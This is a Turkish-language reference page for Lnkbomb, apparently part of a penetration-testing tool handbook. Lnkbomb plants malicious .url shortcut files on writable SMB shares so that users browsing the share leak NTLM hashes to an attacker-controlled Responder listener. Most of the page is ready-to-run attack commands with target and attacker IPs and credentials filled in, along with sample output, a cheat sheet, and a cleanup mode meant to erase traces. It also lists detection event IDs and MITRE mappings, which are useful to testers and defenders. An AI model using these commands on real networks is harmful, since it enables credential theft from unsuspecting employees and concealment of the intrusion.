# Lnkbomb

> **Kategori:** [10. Kurumsal Altyapı, Paylaşım ve Veri Avı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Güvensiz veya yazma izni açık ağ paylaşımlarına (SMB Shares) otomatik olarak zararlı `.url` veya `.lnk` kısayol dosyaları yükleyen, dizini açan kullanıcıların NTLMv1/NTLMv2 karmalarını saldırgana yönlendiren ve test sonrasında yüklenen dosyaları otomatik temizleyen Python tabanlı operasyonel araç.

---

## 1. Genel Bakış ve Amaç

İç ağ sızma testlerinde geniş dosya sunucularında (`\\fs01\muhasebe`, `\\fs01\ortak`) yazma izni bulunan açık paylaşımlar tespit edildiğinde, manuel olarak her klasöre zararlı dosya yüklemek zaman alıcı ve operasyonel güvenlik (OPSEC) açısından hata yapmaya açıktır. Ayrıca test bittiğinde bu dosyaların paylaşımda unutulması kurumsal risk teşkil eder.

**`Lnkbomb`** (Dievus tarafından geliştirilen), `pysmb` kütüphanesini kullanarak kimlik doğrulamalı veya misafir (guest) oturumlarıyla hedef Windows ve Linux (Samba) paylaşımlarına erişir. Belirtilen paylaşıma özel olarak hazırlanmış bir `.url` dosyası enjekte eder. Dosyanın `IconFile` parametresi saldırganın IP adresine işaret ettiği için, kurban kullanıcılar paylaşıma göz attığı anda istemci işletim sistemi ikonu çekmek için saldırgana NTLM kimlik doğrulama isteği gönderir. Test tamamlandığında `-r` parametresi ile yüklenen tüm izler paylaşımdan güvenle silinir.

### Mimari Akış Şeması

```
[ Saldırgan / Kali Linux ]                          [ Açık Dosya Paylaşımı (SMB) ]                     [ Kurban Şirket Çalışanı ]
           │                                                       │                                             │
           ├─── (1) lnkbomb.py -t <Hedef_IP> -a <Saldırgan_IP> ───►│                                             │
           │    Pysmb ile payloads.url yüklenir                    │                                             │
           │                                                       │◄── (2) Paylaşım Klasörünü Açar ─────────────┤
           │                                                       │    (Windows Explorer SMB Read)              │
           │                                                       │                                             │
           │◄── (3) Otomatik NTLMv2 Hash Gelir (Responder) ────────┴─────────────────────────────────────────────┘
           │    (SMB SYN -> NTLM Auth -> Hashcat Formatı)
           │
           ├─── (4) lnkbomb.py -r (Otomatik Temizlik) ────────────► Paylaşımdaki zararlı dosya silinir!
```

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
python3 lnkbomb.py -t <HEDEF_IP> -a <SALDIRGAN_IP> -s <PAYLASIM_ADI> [SEÇENEKLER]
```

### Desteklenen Kritik Bayraklar

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-t, --target` | Paylaşımın bulunduğu hedef Windows/Samba sunucusu IP adresi | `-t 192.168.1.79` |
| `-a, --attacker` | NTLM hash'lerinin toplanacağı saldırgan IP adresi (Responder IP) | `-a 192.168.1.21` |
| `-s, --share` | Dosyanın yükleneceği hedef SMB paylaşım adı | `-s Shared_Docs` |
| `-u, --username` | SMB kimlik doğrulama kullanıcı adı | `-u jdoe` |
| `-p, --password` | SMB kimlik doğrulama parolası | `-p 'P@ssword123!'` |
| `-r, --recover` | Test tamamlandığında önceden yüklenen dosyayı paylaşımdan siler | `-r payload.url` |
| `-w, --windows` | Windows tabanlı dosya paylaşımları için port ve bayrak optimizasyonu | `-w` |
| `-l, --linux` | Samba / Linux tabanlı paylaşımlar için optimizasyon | `-l` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Ortak Paylaşıma Otomatik Yükleme ve Hash Yakalama

```bash
# Adım 1: Kali üzerinde Responder dinleyicisini başlatma
sudo responder -I eth0 -dwv

# Adım 2: Lnkbomb ile paylaşıma zararlı kısayol dosyasını bırakma
python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s "Genel_Paylasim" -u "themayor" -p "Password123!" -n dc01 -w
```

*Çıktı Analizi:*
```text
[*] Connecting to 192.168.1.79...
[+] Authentication Successful as themayor!
[+] Successfully uploaded payload to Genel_Paylasim\payroll_update.url!
[*] Listening for incoming NTLM hashes on 192.168.1.21 (Responder)...
```

### Senaryo 2: Test Bitimi Sonrası Temizlik (Recover Modu)

```bash
# Paylaşıma bırakılan zararlı dosyanın iz bırakmadan silinmesi
python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s "Genel_Paylasim" -u "themayor" -p "Password123!" -n dc01 -r payroll_update.url
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Kök Neden | Çözüm Adımı |
|---|---|---|
| `Unable to connect to share / Access Denied` | Kullanıcının hedef paylaşımda yazma hakkı yoktur (`FILE_WRITE_DATA`). | `nxc smb <IP> -u user -p pass --shares` ile yazılabilir paylaşımları (`READ, WRITE`) listeleyin. |
| `NetBIOS Name error` | `-n` parametresi ile hedef sunucunun NetBIOS adı doğru belirtilmemiştir. | Nbtscan veya nxc ile hedef NetBIOS adını öğrenip `-n <NETBIOS>` olarak girin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler
* **Security Event ID 5145:** Ağ paylaşım nesnesine erişim denetimi (`AccessMask: 0x2 - WriteData`, `RelativeTargetName: *.url`).
* **Sysmon Event ID 11:** Dosya paylaşımında yeni `.url` veya `.lnk` dosyası oluşumu.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım |
|---|---|---|
| **[T1187](https://attack.mitre.org/techniques/T1187/)** | Forced Authentication | Ağ paylaşımı üzerinden zorlamalı NTLM kimlik doğrulama. |
| **[T1070.004](https://attack.mitre.org/techniques/T1070/004/)** | File Deletion | Recover modu ile operasyonel izlerin temizlenmesi. |

---

## 6. En Çok Kullanılan Komutlar (Cheat Sheet)

```bash
# 1. Windows paylaşımına kimlikli zararlı URL kısayolu yükleme
python3 lnkbomb.py -t 10.0.0.15 -a 10.0.0.5 -s Ortak -u admin -p Pass123 -w

# 2. Linux / Samba paylaşımına yükleme
python3 lnkbomb.py -t 10.0.0.20 -a 10.0.0.5 -s Public -u guest -p "" -l

# 3. Yüklenen dosyayı paylaşımdan silerek temizlik yapma
python3 lnkbomb.py -t 10.0.0.15 -a 10.0.0.5 -s Ortak -u admin -p Pass123 -r payload.url

# 4. NetBIOS adı belirterek kesin bağlantı sağlama
python3 lnkbomb.py -t 10.0.0.15 -a 10.0.0.5 -s Muhasebe -n FS01 -w
```

---

## Kaynaklar
- [GitHub — Lnkbomb (Dievus)](https://github.com/dievus/lnkbomb)

---

> **Önceki:** [← MalSCCM](./MalSCCM.md) · **Sonraki:** [PowerUpSQL →](./PowerUpSQL.md)
